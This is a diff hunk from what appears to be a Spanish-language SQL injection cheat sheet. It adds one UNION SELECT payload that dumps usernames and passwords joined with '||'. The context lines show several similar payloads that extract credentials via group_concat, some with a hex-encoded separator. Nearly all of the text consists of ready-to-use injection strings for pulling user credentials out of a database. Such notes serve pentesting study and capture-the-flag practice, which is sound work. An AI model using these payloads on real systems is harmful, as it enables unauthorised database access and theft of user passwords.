@@ -97,6 +97,7 @@ Para que nos muestre los datos de las columnas.
 ❯ ' union select group_concat(username) from ❮DB_Name❯.❮Table_Name❯-- -          # Especificamos la DB y la tabla, si la DB no es la que esta en uso y nos muestra los datos
 ❯ ' union select group_concat(username) from ❮Table_Name❯-- -                    # Para que nos muestre los datos, aqui asumimos que la base de datos es la que esta en uso 
 ❯ ' union select group_concat(username,':',password) from ❮Table_Name❯-- -       # Para que nos muestre los datos de los usuarios y su passwd separados por : 
+❯ ' union select username||':'||password from ❮Table_Name❯-- -                   # Para que nos muestre los datos de los usuarios y su passwd separados por : 
 ❯ ' union select group_concat(username,0x3a,password) from ❮Table_Name❯-- -      # Para que nos muestre los datos de los usuarios y su passwd separados por :
 
 	 # Debemos de colocar los caracteres en Hexadecimal para evitar fallos
